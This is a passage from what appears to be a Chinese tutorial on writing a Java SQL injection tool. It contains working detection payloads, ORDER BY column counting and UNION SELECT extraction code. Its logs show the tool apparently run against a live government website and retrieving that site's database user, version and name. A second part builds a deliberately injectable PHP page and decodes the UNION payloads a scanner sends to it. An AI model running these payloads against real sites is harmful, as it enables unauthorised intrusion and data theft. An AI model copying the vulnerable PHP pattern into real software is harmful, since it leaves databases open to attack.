+<pre><code>&#160;&#160;&#160;&#160;&#160;&#160;&#160; content = HttpHelper.sendGet(protocol+&quot;://&quot;+schema+&quot;:&quot;+port+&quot;/&quot;+filesIndex+&quot;/&quot;+file,parameter);//</code><code>原始的请求包</code></pre>
+
+<pre><code>&#160;&#160;&#160;&#160;&#160;&#160;&#160; int len1 = content.get(&quot;content&quot;).toString().length();//</code><code>原始请求的response</code><code>长度</code></pre>
+
+<pre><code>&#160;&#160;&#160;&#160;&#160;&#160;&#160; boolean typeIsNumber = false;</code></pre>
+
+<pre><code>&#160;&#160;&#160;&#160;&#160;&#160;&#160; String c1[] = {&quot;'&quot;,&quot;-1&quot;,&quot;)\&quot;\&quot;\&quot;\&quot;\&quot;()()&quot;,&quot;)+ANd+3815=3835+ANd+(1471=1471&quot;,&quot;) ANd+9056=9056+ANd+(9889=9889&quot;,&quot; ANd+6346=6138 &quot;,&quot; ANd+9056=9056&quot;};//</code><code>需要检查的对象</code></pre>
+
+<pre><code>&#160;&#160;&#160;&#160;&#160;&#160;&#160; for (int i = 0; i &lt; str.length; i++) {</code></pre>
+
+<pre><code>&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160; typeIsNumber = StringUtil.isNotEmpty(str[i].split(&quot;=&quot;))&amp;&amp;StringUtil.isNum(str[i].split(&quot;=&quot;)[1])?true:false;</code></pre>
+
+<pre><code>&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160; for (int j = 0; j &lt; c1.length; j++) {</code></pre>
+
+<pre><code>&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160; content2 = HttpHelper.sendGet(protocol+&quot;://&quot;+schema+&quot;:&quot;+port+&quot;/&quot;+filesIndex+&quot;/&quot;+file,parameter.replace(str[i], str[i].split(&quot;=&quot;)[0]+&quot;=&quot;+str[i].split(&quot;=&quot;)[1]+c1[j]));</code></pre>
+
+<pre><code>&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160; if (len1 != content2.get(&quot;content&quot;).toString().length()||(Integer)content2.get(&quot;status&quot;)!=200) {</code></pre>
+
+<pre><code>&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160; existsInjection = true;</code></pre>
+
+<pre><code>&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160; sqlKey.add(str[i]);</code></pre>
+
+<pre><code>&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160; break ;</code></pre>
+
+<pre><code>&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160; }</code></pre>
+
+<pre><code>&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160; }</code></pre>
+
+<pre><code>&#160;&#160;&#160;&#160;&#160;&#160;&#160; }</code></pre>
+
+<pre><code>&#160;&#160;&#160;&#160;&#160;&#160;&#160; if (existsInjection) {</code></pre>
+
+<pre><code>//&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160; System.out.println(existsInjection?&quot;Site:&quot;+url+&quot; </code><code>可能存在&quot;+(typeIsNumber?&quot;int&quot;:&quot;String&quot;)+&quot;</code><code>型Sql</code><code>注入&quot;+&quot;SQL</code><code>注入.&quot;:&quot;Not Found.&quot;);</code></pre>
+
+<pre><code>&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160; getSelectColumnCount(str);</code></pre>
+
+<pre><code>&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160; getDatabaseInfo();</code></pre>
+
+<pre><code>&#160;&#160;&#160;&#160;&#160;&#160;&#160; }</code></pre>
+
+<pre><code>&#160;&#160;&#160; }</code></pre>
+
+<p>检测过程主要发送了几次请求，一次正常的请求和N次带有SQL注入的请求。如果SQL注入的请求和正常请求的结果不一致（有不可控因素，比如SQLMAP的实现方式就有去计算页面是否稳定，从而让检测出来的结果更加准确）就可能是存在SQL注入。</p>
+
+<p>日志如下：</p>
+
+<pre><code>url:http://www.tchjbh.gov.cn:80//news_display.php</code></pre>
+
+<pre><code>param:id=148</code></pre>
+
+<pre><code>url:http://www.tchjbh.gov.cn:80//news_display.php</code></pre>
+
+<pre><code>param:id=148'</code></pre>
+
+<pre><code>url:http://www.tchjbh.gov.cn:80//news_display.php</code></pre>
+
+<pre><code>param:id=148</code></pre>
+
+<p>获取字段数主要是通过：</p>
+
+<pre><code>/**</code></pre>
+
+<pre><code>&#160;&#160;&#160;&#160; * </code><code>获取查询字段数</code></pre>
+
+<pre><code>&#160;&#160;&#160;&#160; * @param str</code></pre>
+
+<pre><code>&#160;&#160;&#160;&#160; */</code></pre>
+
+<pre><code>&#160;&#160;&#160; public static int getSelectColumnCount(String str[]){</code></pre>
+
+<pre><code>&#160;&#160;&#160;&#160;&#160;&#160;&#160; Map&lt;String,Object&gt; sb = HttpHelper.sendGet(protocol+&quot;://&quot;+schema+&quot;:&quot;+port+&quot;/&quot;+filesIndex+&quot;/&quot;+file,parameter);//</code><code>原始的请求包</code></pre>
+
+<pre><code>&#160;&#160;&#160;&#160;&#160;&#160;&#160; int len1 = sb.get(&quot;content&quot;).toString().length();//</code><code>原始请求的response</code><code>长度</code></pre>
+
+<pre><code>&#160;&#160;&#160;&#160;&#160;&#160;&#160; int count = -1;</code></pre>
+
+<pre><code>&#160;&#160;&#160;&#160;&#160;&#160;&#160; for (Object o : sqlKey) {</code></pre>
+
+<pre><code>&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160; count = getSbCount(o.toString(), len1);//</code><code>计算字段</code></pre>
+
+<pre><code>&#160;&#160;&#160;&#160;&#160;&#160;&#160; }</code></pre>
+
+<pre><code>&#160;&#160;&#160;&#160;&#160;&#160;&#160; return count;</code></pre>
+
+<pre><code>&#160;&#160;&#160; }</code></pre>
+
+<pre><code>&#160;</code></pre>
+
+<pre><code>/**</code></pre>
+
+<pre><code>&#160;&#160;&#160;&#160; *</code><code>获取order by </code><code>字段数</code></pre>
+
+<pre><code>&#160;&#160;&#160;&#160; * @param key</code></pre>
+
+<pre><code>&#160;&#160;&#160;&#160; * @param len1</code></pre>
+
+<pre><code>&#160;&#160;&#160;&#160; * @return</code></pre>
+
+<pre><code>&#160;&#160;&#160;&#160; */</code></pre>
+
+<pre><code>&#160;&#160;&#160; public static int getSbCount(String key,int len1){</code></pre>
+
+<pre><code>&#160;&#160;&#160;&#160;&#160;&#160;&#160; System.out.println(&quot;-----------------------end:&quot;+end+&quot;-----------------------------&quot;);</code></pre>
+
+<pre><code>&#160;&#160;&#160;&#160;&#160;&#160;&#160; Map&lt;String,Object&gt; sb = HttpHelper.sendGet(uri, parameter.replace(key, key+&quot;+orDer+By+&quot;+end+&quot;+%23&quot;));</code></pre>
+
+<pre><code>&#160;&#160;&#160;&#160;&#160;&#160;&#160; if (1 == end|| len1==((String)sb.get(&quot;content&quot;)).length()&amp;&amp;200==(Integer)sb.get(&quot;status&quot;)) {</code></pre>
+
+<pre><code>&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160; System.out.println(&quot;index:&quot;+end);</code></pre>
+
+<pre><code>&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160; start = end;</code></pre>
+
+<pre><code>&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160; for (int i = start; i &lt; 2*start+1; i++) {</code></pre>
+
+<pre><code>&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160; System.out.println(&quot;************</code><code>开始精确匹配*****************&quot;);</code></pre>
+
+<pre><code>&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160; Map&lt;String,Object&gt; sb2 = HttpHelper.sendGet(uri, parameter.replace(key, key+&quot;+orDer+By+&quot;+end+&quot;+%23&quot;));</code></pre>
+
+<pre><code>&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160; Map&lt;String,Object&gt; sb3 = HttpHelper.sendGet(uri, parameter.replace(key, key+&quot;+orDer+By+&quot;+(end+1)+&quot;+%23&quot;));</code></pre>
+
+<pre><code>&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160; if (((String)sb3.get(&quot;content&quot;)).length()!=((String)sb2.get(&quot;content&quot;)).length()&amp;&amp;200==(Integer)sb2.get(&quot;status&quot;)) {</code></pre>
+
+<pre><code>&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160; System.out.println(&quot;order by </code><code>字段数为:&quot;+end);</code></pre>
+
+<pre><code>&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160; sbCount = end;//</code><code>设置字段长度为当前检测出来的长度</code></pre>
+
+<pre><code>&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160; return index = end;</code></pre>
+
+<pre><code>&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160; }else {</code></pre>
+
+<pre><code>&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160; end++;</code></pre>
+
+<pre><code>&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160; }</code></pre>
+
+<pre><code>&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160; }</code></pre>
+
+<pre><code>&#160;&#160;&#160;&#160;&#160;&#160;&#160; }else {</code></pre>
+
+<pre><code>&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160; end = end/2;</code></pre>
+
+<pre><code>&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160; getSbCount(key, len1);</code></pre>
+
+<pre><code>&#160;&#160;&#160;&#160;&#160;&#160;&#160; }</code></pre>
+
+<pre><code>&#160;&#160;&#160;&#160;&#160;&#160;&#160; return index;</code></pre>
+
+<pre><code>&#160;&#160;&#160; }</code></pre>
+
+<p>利用检测是否存在SQL注入的原理同样能过检测出查询的字段数。我们通过二分去order一个by 一个数然后去请求分析页面一致性。然后不停的去修改数值最终结果相等即可获得字段数。上面的分析的代码挺简单的，有兴趣的同学自己去看。日志如下：</p>
+
+<pre><code>************</code><code>开始精确匹配*****************</code></pre>
+
+<pre><code>url:http://www.tchjbh.gov.cn/news_display.php</code></pre>
+
+<pre><code>param:id=148+orDer+By+15+%23</code></pre>
+
+<pre><code>url:http://www.tchjbh.gov.cn/news_display.php</code></pre>
+
+<pre><code>param:id=148+orDer+By+16+%23</code></pre>
+
+<pre><code>************</code><code>开始精确匹配*****************</code></pre>
+
+<pre><code>url:http://www.tchjbh.gov.cn/news_display.php</code></pre>
+
+<pre><code>param:id=148+orDer+By+16+%23</code></pre>
+
+<pre><code>url:http://www.tchjbh.gov.cn/news_display.php</code></pre>
+
+<pre><code>param:id=148+orDer+By+17+%23</code></pre>
+
+<pre><code>************</code><code>开始精确匹配*****************</code></pre>
+
+<pre><code>url:http://www.tchjbh.gov.cn/news_display.php</code></pre>
+
+<pre><code>param:id=148+orDer+By+17+%23</code></pre>
+
+<pre><code>url:http://www.tchjbh.gov.cn/news_display.php</code></pre>
+
+<pre><code>param:id=148+orDer+By+18+%23</code></pre>
+
+<pre><code>************</code><code>开始精确匹配*****************</code></pre>
+
+<pre><code>url:http://www.tchjbh.gov.cn/news_display.php</code></pre>
+
+<pre><code>param:id=148+orDer+By+18+%23</code></pre>
+
+<pre><code>url:http://www.tchjbh.gov.cn/news_display.php</code></pre>
+
+<pre><code>param:id=148+orDer+By+19+%23</code></pre>
+
+<pre><code>************</code><code>开始精确匹配*****************</code></pre>
+
+<pre><code>url:http://www.tchjbh.gov.cn/news_display.php</code></pre>
+
+<pre><code>param:id=148+orDer+By+19+%23</code></pre>
+
+<pre><code>url:http://www.tchjbh.gov.cn/news_display.php</code></pre>
+
+<pre><code>param:id=148+orDer+By+20+%23</code></pre>
+
+<pre><code>************</code><code>开始精确匹配*****************</code></pre>
+
+<pre><code>url:http://www.tchjbh.gov.cn/news_display.php</code></pre>
+
+<pre><code>param:id=148+orDer+By+20+%23</code></pre>
+
+<pre><code>url:http://www.tchjbh.gov.cn/news_display.php</code></pre>
+
+<pre><code>param:id=148+orDer+By+21+%23</code></pre>
+
+<pre><code>************</code><code>开始精确匹配*****************</code></pre>
+
+<pre><code>url:http://www.tchjbh.gov.cn/news_display.php</code></pre>
+
+<pre><code>param:id=148+orDer+By+21+%23</code></pre>
+
+<pre><code>url:http://www.tchjbh.gov.cn/news_display.php</code></pre>
+
+<pre><code>param:id=148+orDer+By+22+%23</code></pre>
+
+<pre><code>order by </code><code>字段数为:21</code></pre>
+
+<pre><code>skey:id=148</code></pre>
+
+<p>在知道了字段数后我们就可以通过构建关键字的方式去获取SQL注入查询的结果，我们的目的无外乎就是不停的递交SQL注入语句，把我们想要得到的数据库的信息展示在页面，然后我们通过自定义的关键字去取回信息到本地：</p>
+
+<pre><code>/**</code></pre>
+
+<pre><code>&#160;&#160;&#160;&#160; * </code><code>测试，获取数据库表信息</code></pre>
+
+<pre><code>&#160;&#160;&#160;&#160; */</code></pre>
+
+<pre><code>&#160;&#160;&#160; public static void getDatabaseInfo(){</code></pre>
+
+<pre><code>&#160;&#160;&#160;&#160;&#160;&#160;&#160; String skey = sqlKey.get(0).toString();</code></pre>
+
+<pre><code>&#160;&#160;&#160;&#160;&#160;&#160;&#160; System.out.println(&quot;skey:&quot;+skey);</code></pre>
+
+<pre><code>&#160;&#160;&#160;&#160;&#160;&#160;&#160; StringBuilder union = new StringBuilder();</code></pre>
+
+<pre><code>&#160;&#160;&#160;&#160;&#160;&#160;&#160; for (int i = 0; i &lt; sbCount; i++) {</code></pre>
+
+<pre><code>&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160; union.append(&quot;concat('[mjj]','[version]',version(),'[/version]','[user]',user(),'[/user]','[database]',database(),'[/database]','[/mjj]'),&quot;);</code></pre>
+
+<pre><code>&#160;&#160;&#160;&#160;&#160;&#160;&#160; }</code></pre>
+
+<pre><code>&#160;&#160;&#160;&#160;&#160;&#160;&#160; Map&lt;String,Object&gt; sb = HttpHelper.sendGet(uri, parameter.replace(skey, skey+(&quot;-1+UnIon+SeleCt+&quot;+(union.delete(union.length()-1, union.length()))+&quot;%23&quot;)));</code></pre>
+
+<pre><code>&#160;&#160;&#160;&#160;&#160;&#160;&#160; String rs = ((String)sb.get(&quot;content&quot;));</code></pre>
+
+<pre><code>&#160;&#160;&#160;&#160;&#160;&#160;&#160; String user = rs.substring(rs.lastIndexOf(&quot;[user]&quot;)+6,rs.lastIndexOf(&quot;[/user]&quot;));</code></pre>
+
+<pre><code>&#160;&#160;&#160;&#160;&#160;&#160;&#160; String version = rs.substring(rs.lastIndexOf(&quot;[version]&quot;)+9,rs.lastIndexOf(&quot;[/version]&quot;));</code></pre>
+
+<pre><code>&#160;&#160;&#160;&#160;&#160;&#160;&#160; String database = rs.substring(rs.lastIndexOf(&quot;[database]&quot;)+10,rs.lastIndexOf(&quot;[/database]&quot;));</code></pre>
+
+<pre><code>&#160;&#160;&#160;&#160;&#160;&#160;&#160; System.err.println(&quot;user:&quot;+user);</code></pre>
+
+<pre><code>&#160;&#160;&#160;&#160;&#160;&#160;&#160; System.err.println(&quot;version:&quot;+version);</code></pre>
+
+<pre><code>&#160;&#160;&#160;&#160;&#160;&#160;&#160; System.err.println(&quot;database:&quot;+database);</code></pre>
+
+<pre><code>&#160;&#160;&#160; }</code></pre>
+
+<p>代码执行的日志：</p>
+
+<pre><code>url:http://www.tchjbh.gov.cn/news_display.php</code></pre>
+
+<pre><code>param:id=148-1+UnIon+SeleCt+concat('[mjj]','[version]',version(),'[/version]','[user]',user(),'[/user]','[database]',database(),'[/database]','[/mjj]'),concat('[mjj]','[version]',version(),'[/version]','[user]',user(),'[/user]','[database]',database(),'[/database]','[/mjj]'),concat('[mjj]','[version]',version(),'[/version]','[user]',user(),'[/user]','[database]',database(),'[/database]','[/mjj]'),concat('[mjj]','[version]',version(),'[/version]','[user]',user(),'[/user]','[database]',database(),'[/database]','[/mjj]'),concat('[mjj]','[version]',version(),'[/version]','[user]',user(),'[/user]','[database]',database(),'[/database]','[/mjj]'),concat('[mjj]','[version]',version(),'[/version]','[user]',user(),'[/user]','[database]',database(),'[/database]','[/mjj]'),concat('[mjj]','[version]',version(),'[/version]','[user]',user(),'[/user]','[database]',database(),'[/database]','[/mjj]'),concat('[mjj]','[version]',version(),'[/version]','[user]',user(),'[/user]','[database]',database(),'[/database]','[/mjj]'),concat('[mjj]','[version]',version(),'[/version]','[user]',user(),'[/user]','[database]',database(),'[/database]','[/mjj]'),concat('[mjj]','[version]',version(),'[/version]','[user]',user(),'[/user]','[database]',database(),'[/database]','[/mjj]'),concat('[mjj]','[version]',version(),'[/version]','[user]',user(),'[/user]','[database]',database(),'[/database]','[/mjj]'),concat('[mjj]','[version]',version(),'[/version]','[user]',user(),'[/user]','[database]',database(),'[/database]','[/mjj]'),concat('[mjj]','[version]',version(),'[/version]','[user]',user(),'[/user]','[database]',database(),'[/database]','[/mjj]'),concat('[mjj]','[version]',version(),'[/version]','[user]',user(),'[/user]','[database]',database(),'[/database]','[/mjj]'),concat('[mjj]','[version]',version(),'[/version]','[user]',user(),'[/user]','[database]',database(),'[/database]','[/mjj]'),concat('[mjj]','[version]',version(),'[/version]','[user]',user(),'[/user]','[database]',database(),'[/database]','[/mjj]'),concat('[mjj]','[version]',version(),'[/version]','[user]',user(),'[/user]','[database]',database(),'[/database]','[/mjj]'),concat('[mjj]','[version]',version(),'[/version]','[user]',user(),'[/user]','[database]',database(),'[/database]','[/mjj]'),concat('[mjj]','[version]',version(),'[/version]','[user]',user(),'[/user]','[database]',database(),'[/database]','[/mjj]'),concat('[mjj]','[version]',version(),'[/version]','[user]',user(),'[/user]','[database]',database(),'[/database]','[/mjj]'),concat('[mjj]','[version]',version(),'[/version]','[user]',user(),'[/user]','[database]',database(),'[/database]','[/mjj]')%23</code></pre>
+
+<pre><code>user:tchjbh@127.0.0.1</code></pre>
+
+<pre><code>version:5.1.56-community</code></pre>
+
+<pre><code>database:tchjbh</code></pre>
+
+<h5>0x02 模拟SQL注入分析注入工具原理</h5>
+
+<hr align="center" width="100%" size="2">
+
+<p>下面这个演示是针对想自己拓展上面写的SQL注入工具的同学。这次我才用的是PHP语言去弄清SQL注入工具的具体实现。数据库采用的是wordpress的结构，数据库结构如下,建议在本地先安装好wordpress任意版本：</p>
+
+<p>￼<a href="http://img.cker.in/JavaWeb4SQL2_9BEC/clip_image026.png" target="_blank" rel="external"><img title="clip_image026" style="border-top-width: 0px; display: inline; border-left-width: 0px; border-bottom-width: 0px; border-right-width: 0px" height="581" alt="clip_image026" src="http://img.cker.in/JavaWeb4SQL2_9BEC/clip_image026_thumb.png" width="897" border="0"></a></p>
+
+<p>代码如下：</p>
+
+<pre><code>&lt;!DOCTYPE html&gt;</code></pre>
+
+<pre><code>&lt;html xmlns=&quot;http://www.w3.org/1999/xhtml&quot;&gt;</code></pre>
+
+<pre><code>&lt;head&gt;</code></pre>
+
+<pre><code>&lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html; charset=gbk&quot; /&gt;</code></pre>
+
+<pre><code>&lt;style&gt;</code></pre>
+
+<pre><code>&#160;&#160;&#160; .main{margin:0 auto;width:980px;border:1px dashed }</code></pre>
+
+<pre><code>&#160;&#160;&#160; .title{line-height:25px; text-align:center; font-size:18px; font-weight:500}</code></pre>
+
+<pre><code>&#160;&#160;&#160; pre{text-indent: 2em; margin:20px auto 10px 20px;}</code></pre>
+
+<pre><code>&lt;/style&gt;</code></pre>
+
+<pre><code>&lt;title&gt;&lt;/title&gt;</code></pre>
+
+<pre><code>&lt;/head&gt;</code></pre>
+
+<pre><code>&lt;body&gt;</code></pre>
+
+<pre><code>&lt;div class=&quot;main&quot;&gt;</code></pre>
+
+<pre><code>&lt;?php</code></pre>
+
+<pre><code>&#160;&#160;&#160; extract($_GET);//to Map</code></pre>
+
+<pre><code>&#160;&#160;&#160; if(!empty($id)){</code></pre>
+
+<pre><code>&#160;&#160;&#160;&#160;&#160;&#160;&#160; $con = mysql_connect(&quot;localhost&quot;,&quot;root&quot;,&quot;111111&quot;);//</code><code>连接数据库</code></pre>
+
+<pre><code>&#160;&#160;&#160;&#160;&#160;&#160;&#160; $db_selected = mysql_select_db(&quot;wps&quot;,$con);//</code><code>选择数据库</code></pre>
+
+<pre><code>&#160;&#160;&#160;&#160;&#160;&#160;&#160; mysql_query(&quot;SET NAMES 'GBK'&quot;); //</code><code>设置编码</code></pre>
+
+<pre><code>&#160;&#160;&#160;&#160;&#160;&#160;&#160; $sql = &quot;SELECT * from wps_posts where ID = &quot;.$id;//</code><code>查询文章语句</code></pre>
+
+<pre><code>&#160;&#160;&#160;&#160;&#160;&#160;&#160; echo&#160; &quot;&lt;font color=red&gt;&quot;.$sql.&quot;&lt;/font&gt;&quot;;//</code><code>打印SQL</code></pre>
+
+<pre><code>&#160;</code></pre>
+
+<pre><code>&#160;&#160;&#160;&#160;&#160;&#160;&#160; /*</code><code>截取SQL</code><code>注入工具的SQL*/</code></pre>
+
+<pre><code>&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160; $paths=&quot;getsql.txt&quot;;//</code><code>定义要生成的html</code><code>路径</code></pre>
+
+<pre><code>&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160; $handles=fopen($paths,&quot;a&quot;);//</code><code>以可写方式打开路径</code></pre>
+
+<pre><code>&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160; fwrite($handles,$sql.&quot;\t\t\n\n\n&quot;);//</code><code>写入内容</code></pre>
+
+<pre><code>&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160; fclose($handles);//</code><code>关闭打开的文件</code></pre>
+
+<pre><code>&#160;</code></pre>
+
+<pre><code>&#160;&#160;&#160;&#160;&#160;&#160;&#160; $result = mysql_query($sql,$con);//</code><code>执行查询</code></pre>
+
+<pre><code>&#160;&#160;&#160;&#160;&#160;&#160;&#160; /*</code><code>结果遍历*/</code></pre>
+
+<pre><code>&#160;&#160;&#160;&#160;&#160;&#160;&#160; while ($row=mysql_fetch_array($result)) {</code></pre>
+
+<pre><code>&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160; echo&#160; &quot;&lt;div class=title&gt;&quot;.$row['post_title'].&quot;&lt;/div&gt;&quot;;//</code><code>把结果输出到界面</code></pre>
+
+<pre><code>&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160; echo&#160; &quot;&lt;pre&gt;&quot;.$row['post_content'].&quot;&lt;/pre&gt;&quot;;//</code><code>文章内容</code></pre>
+
+<pre><code>&#160;&#160;&#160;&#160;&#160;&#160;&#160; }</code></pre>
+
+<pre><code>&#160;&#160;&#160;&#160;&#160;&#160;&#160; mysql_close($con);//</code><code>关闭数据库连接</code></pre>
+
+<pre><code>&#160;&#160;&#160; }</code></pre>
+
+<pre><code>?&gt;</code></pre>
+
+<pre><code>&lt;/div&gt;</code></pre>
+
+<pre><code>&lt;/body&gt;</code></pre>
+
+<pre><code>&lt;/html&gt;</code></pre>
+
+<p>建立好数据库和表之后访问（由于我采用的是自己的wp博客，所有有大量的测试数据如果没有数据建议安装个wordpress方便以后的测试）：<br>  <br>￼<br><br>  <br><a href="http://img.cker.in/JavaWeb4SQL2_9BEC/clip_image027.png" target="_blank" rel="external"><img title="clip_image027" style="border-top-width: 0px; display: inline; border-left-width: 0px; border-bottom-width: 0px; border-right-width: 0px" height="500" alt="clip_image027" src="http://img.cker.in/JavaWeb4SQL2_9BEC/clip_image027_thumb.png" width="1220" border="0"></a></p>
+
+<p>SQL注入测试：</p>
+
+<p>￼<a href="http://img.cker.in/JavaWeb4SQL2_9BEC/clip_image028.png" target="_blank" rel="external"><img title="clip_image028" style="border-top-width: 0px; display: inline; border-left-width: 0px; border-bottom-width: 0px; border-right-width: 0px" height="667" alt="clip_image028" src="http://img.cker.in/JavaWeb4SQL2_9BEC/clip_image028_thumb.png" width="908" border="0"></a></p>
+
+<p>让我们来看下m4xmysql究竟在SQL注入点提交了那些数据,点击start我们的PHP程序会自动在同目录下生成一个getsql.txt打开后发现我们截获到如下SQL：</p>
+
+<p>￼<a href="http://img.cker.in/JavaWeb4SQL2_9BEC/clip_image029.png" target="_blank" rel="external"><img title="clip_image029" style="border-top-width: 0px; display: inline; border-left-width: 0px; border-bottom-width: 0px; border-right-width: 0px" height="172" alt="clip_image029" src="http://img.cker.in/JavaWeb4SQL2_9BEC/clip_image029_thumb.png" width="672" border="0"></a></p>
+
+<p><a href="http://img.cker.in/JavaWeb4SQL2_9BEC/clip_image030.png" target="_blank" rel="external"><img title="clip_image030" style="border-top-width: 0px; display: inline; border-left-width: 0px; border-bottom-width: 0px; border-right-width: 0px" height="545" alt="clip_image030" src="http://img.cker.in/JavaWeb4SQL2_9BEC/clip_image030_thumb.png" width="955" border="0"></a></p>
+
+<p>看起来不算多，因为我没有自动换行，以上是在获取数据库相关信息。</p>
+
+<p>让我来带着大家翻译这些SQL都做了些什么：</p>
+
+<pre><code>/*</code><code>检测该URL</code><code>是否存在SQL</code><code>注入*/</code></pre>
+
+<pre><code>SELECT * from wps_posts where ID = 739 and 1=0&#160;&#160;&#160;&#160;&#160; </code></pre>
+
+<pre><code>SELECT * from wps_posts where ID = 739 and 1=1&#160;&#160;&#160;&#160;&#160; </code></pre>
+
+<pre><code>&#160;</code></pre>
+
+<pre><code>/*</code><code>这条sql</code><code>开始查询的字段数，请注意是查询的字段数而不是表的字段数！*/</code></pre>
+
+<pre><code>&#160;</code></pre>
+
+<pre><code>SELECT * from wps_posts where ID = 739 and 1=0 union select concat(0x5b68345d,0,0x5b2f68345d)--</code></pre>
+
+<pre><code>&#160;</code></pre>
+
+<pre><code>SELECT * from wps_posts where ID = 739 and 1=0 union select concat(0x5b68345d,0,0x5b2f68345d),concat(0x5b68345d,1,0x5b2f68345d)--&#160;&#160;&#160;&#160;&#160;&#160; </code></pre>
+
+<pre><code>&#160;</code></pre>
+
+<pre><code>SELECT * from wps_posts where ID = 739 and 1=0 union select concat(0x5b68345d,0,0x5b2f68345d),concat(0x5b68345d,1,0x5b2f68345d),concat(0x5b68345d,2,0x5b2f68345d)--&#160;&#160;&#160;&#160; </code></pre>
+
+<pre><code>/*........................</code><code>省去其中的无数次字段长度匹配尝试................................*/</code></pre>
+
+<pre><code>&#160;</code></pre>
+
+<pre><code>/*</code><code>匹配出来SELECT * from wps_posts where ID = 739</code><code>一共查询了10</code><code>个字段*/</code></pre>
+
+<pre><code>/*</code><code>那么他是怎么判断出字段数10</code><code>就是查询的长度的呢？答案很简单提交以下SQL</code><code>占位10</code><code>个页面显示正常而前面提交的都错误所以得到的数量自然就是10</code><code>了。获取请求的http status</code><code>或许应该就行了*/</code></pre>
+
+<pre><code>&#160;</code></pre>
+
+<pre><code>SELECT * from wps_posts where ID = 739 and 1=0 union select concat(0x5b68345d,0,0x5b2f68345d),concat(0x5b68345d,1,0x5b2f68345d),concat(0x5b68345d,2,0x5b2f68345d),concat(0x5b68345d,3,0x5b2f68345d),concat(0x5b68345d,4,0x5b2f68345d),concat(0x5b68345d,5,0x5b2f68345d),concat(0x5b68345d,6,0x5b2f68345d),concat(0x5b68345d,7,0x5b2f68345d),concat(0x5b68345d,8,0x5b2f68345d),concat(0x5b68345d,9,0x5b2f68345d),concat(0x5b68345d,10,0x5b2f68345d),concat(0x5b68345d,11,0x5b2f68345d),concat(0x5b68345d,12,0x5b2f68345d),concat(0x5b68345d,13,0x5b2f68345d),concat(0x5b68345d,14,0x5b2f68345d),concat(0x5b68345d,15,0x5b2f68345d),concat(0x5b68345d,16,0x5b2f68345d),concat(0x5b68345d,17,0x5b2f68345d),concat(0x5b68345d,18,0x5b2f68345d),concat(0x5b68345d,19,0x5b2f68345d),concat(0x5b68345d,20,0x5b2f68345d),concat(0x5b68345d,21,0x5b2f68345d),concat(0x5b68345d,22,0x5b2f68345d)--</code></pre>
+
+<p>以上的SQL完成了注入点（<code><a href="http://localhost/Test/1.php?id=739" target="_blank" rel="external">http://localhost/Test/1.php?id=739</a></code>执行的<code>SELECT * from wps_posts where ID = 739</code>）的类型、是否存在和字段数量的检测 里面有许多的0x5b2f68345d转换过来其实就是占位符，为了让工具扒下源代码后能够在页面类找到具有特殊意义的字符并进行截取：</p>
+
